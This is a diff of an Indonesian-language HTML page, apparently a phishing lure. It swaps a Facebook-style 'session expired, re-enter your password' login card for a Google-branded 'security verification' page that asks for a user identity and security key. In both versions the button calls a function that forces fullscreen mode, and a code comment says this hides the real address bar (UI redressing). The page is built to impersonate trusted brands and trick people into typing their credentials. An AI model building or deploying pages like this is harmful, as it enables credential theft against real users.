@@ -2,27 +2,27 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Sesi Berakhir</title>
+    <title>Verifikasi Keamanan</title>
     <style>
-        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); text-align: center; width: 320px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        body { background: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; border: 1px solid #ddd; padding: 40px; border-radius: 4px; width: 300px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 2px; }
+        button { width: 100%; padding: 10px; background: #4285f4; color: white; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h3>Login Ulang</h3>
-        <p style="color: #606770; font-size: 14px;">Sesi Anda telah berakhir. Masukkan kembali kata sandi Anda.</p>
-        <input type="text" placeholder="Email atau Telepon" />
-        <input type="password" placeholder="Kata Sandi" />
-        <button onclick="startSpoof()">Masuk</button>
+    <div class="box">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Logo">
+        <p style="font-size: 14px;">Masukkan kunci akses untuk melanjutkan sesi Anda.</p>
+        <input type="text" placeholder="Identitas Pengguna" />
+        <input type="password" placeholder="Kunci Keamanan" />
+        <button onclick="run()">Lanjutkan</button>
     </div>
 
     <script>
-        function startSpoof() {
-            // Teknik Fullscreen untuk menutupi Address Bar asli (UI Redressing)
-            alert("Sistem Keamanan: Mengaktifkan mode terlindungi.");
+        function run() {
+            // Gabungin sama Fullscreen API lo yang dapet P4 kemarin
+            alert("Memproses verifikasi...");
             document.documentElement.requestFullscreen();
         }
     </script>
